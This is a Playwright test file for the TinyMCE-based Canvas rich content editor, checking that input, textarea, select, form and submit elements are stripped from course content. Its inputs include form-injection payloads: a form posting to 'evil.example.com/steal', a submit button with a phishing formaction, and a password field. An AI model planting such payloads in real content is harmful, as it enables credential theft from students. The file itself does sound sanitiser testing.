import {test, expect} from '../../fixtures/test'

// Form elements (<input>, <textarea>, <select>, <button>) inside course content
// are a form injection vector — they can hijack Canvas form submissions or trick
// students into entering credentials. TinyMCE should strip or neuter them.
// This documents what canvas-rce actually allows through its filter.
test.describe('form element sanitization', () => {
  test.beforeEach(async ({page, rcePage}) => {
    await page.goto('/scenarios/basic')
    await rcePage.waitForEditor()
  })

  async function setAndGet(page: any, html: string): Promise<string> {
    return page.evaluate((content: string) => {
      // @ts-expect-error -- TinyMCE global
      window.tinymce.activeEditor.setContent(content)
      // @ts-expect-error -- TinyMCE global
      return window.tinymce.activeEditor.getContent()
    }, html)
  }

  test('<input type="text"> is stripped or its value is not executable', async ({page}) => {
    const content = await setAndGet(
      page,
      '<p>Enter your info: <input type="text" name="username" /></p>',
    )
    // Input must not appear as a live form field that can be submitted
    // TinyMCE may strip or convert it — both are acceptable
    expect(content).not.toContain('name="username"')
    expect(content).toContain('Enter your info')
  })

  test('<input type="password"> is stripped', async ({page}) => {
    const content = await setAndGet(page, '<input type="password" placeholder="Enter password" />')
    expect(content).not.toContain('type="password"')
    expect(content).not.toContain('placeholder="Enter password"')
  })

  test('<textarea> form element is stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<p>Feedback:</p><textarea name="feedback" rows="4">default text</textarea>',
    )
    // Either stripped or inert — textarea must not be a live form field
    if (content.includes('<textarea')) {
      expect(content).not.toContain('name="feedback"')
    }
    expect(content).toContain('Feedback')
  })

  test('<select> dropdown is stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<select name="choice"><option value="a">Option A</option><option value="b">Option B</option></select>',
    )
    expect(content).not.toContain('<select')
  })

  test('<form> wrapper element is stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<form action="https://evil.example.com/steal" method="POST"><p>Content inside form</p></form>',
    )
    expect(content).not.toContain('<form')
    expect(content).not.toContain('evil.example.com')
    expect(content).toContain('Content inside form')
  })

  test('<input type="hidden"> is stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<p>Visible</p><input type="hidden" name="csrf_token" value="stolen" />',
    )
    expect(content).not.toContain('csrf_token')
    expect(content).not.toContain('stolen')
    expect(content).toContain('Visible')
  })

  test('<input type="submit"> button is stripped or formaction removed', async ({page}) => {
    const content = await setAndGet(
      page,
      '<input type="submit" value="Click me" formaction="https://evil.example.com/phish" />',
    )
    expect(content).not.toContain('formaction')
    expect(content).not.toContain('evil.example.com')
  })
})
